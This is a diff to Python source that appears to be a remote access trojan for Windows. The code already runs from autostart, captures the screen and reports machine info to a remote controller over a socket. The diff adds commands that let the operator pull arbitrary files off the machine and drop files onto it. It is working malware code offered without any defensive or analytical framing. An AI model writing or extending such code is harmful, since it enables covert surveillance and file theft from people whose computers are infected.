@@ -96,7 +96,7 @@ def Send(sock, data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
     sock.sendall(str(size) + '%:::%' + msg)
 
 
-def Receive(sock, splitter='%:::%', mode='info', end="[ENDOFMESSAGE]"):
+def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     recievedData = ""
     l = sock.recv(1024)
     while l:
@@ -111,6 +111,39 @@ def Receive(sock, splitter='%:::%', mode='info', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
+def upload(sock, filename, end="[ENDOFMESSAGE]"):
+    if not os.path.exists(filename):
+        return 'fileExistsError'
+
+    sock.sendall(str(os.path.getsize(filename)))
+    if sock.recv(2) == 'ok':
+        with open(filename, 'rb') as _file:
+            while 1:
+                l = _file.readline()
+                if l:
+                    sock.sendall(l)
+                else:
+                    sock.sendall(end)
+                    break
+            return 'uploadDone'
+    return 'uploadError'
+
+def download(sock, filename, end="[ENDOFMESSAGE]"):
+    recievedData = ''
+    try:
+        l = sock.recv(1024)
+        while l:
+            recievedData += l
+            if recievedData.endswith(end):
+                break
+            else:
+                l = sock.recv(1024)
+        with open(filename, 'wb') as _file:
+            _file.write(recievedData[:-len(end)])
+        return 'downloadDone'
+    except:
+        return 'downloadError'
+
 
 def ScreenBITS():
     hDesktopDC = User32.GetWindowDC(hDesktopWnd)
@@ -123,7 +156,7 @@ def ScreenBITS():
     DIB_RGB_COLORS = 0
     Gdi32.GetDIBits(hdc, hCaptureBitmap, 0, 0, None, ctypes.byref(bmp_info), DIB_RGB_COLORS)
     bmp_info.bmiHeader.biSizeimage = int(
-        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8);
+        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
     pBuf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
     Gdi32.GetBitmapBits(hCaptureBitmap, bmp_info.bmiHeader.biSizeimage, pBuf)
     return zlib.compress(pBuf)
@@ -251,6 +284,18 @@ def fromAutostart():
                             stdoutput = PCINFO()
                         elif data == 'getScreen':
                             stdoutput = SCREENSHOT()
+                        elif data.startswith('upload '):
+                            try:
+                                filename = data.split(' ')[1]
+                                stdoutput = download(s, filename)
+                            except:
+                                stdoutput = 'uploadError'
+                        elif data.startswith('download '):
+                            try:
+                                filename = data.split(' ')[1]
+                                stdoutput = upload(s, filename)
+                            except:
+                                stdoutput = 'downloadError'
                         elif data.startswith("cd"):
                             try:
                                 os.chdir(data[3:])
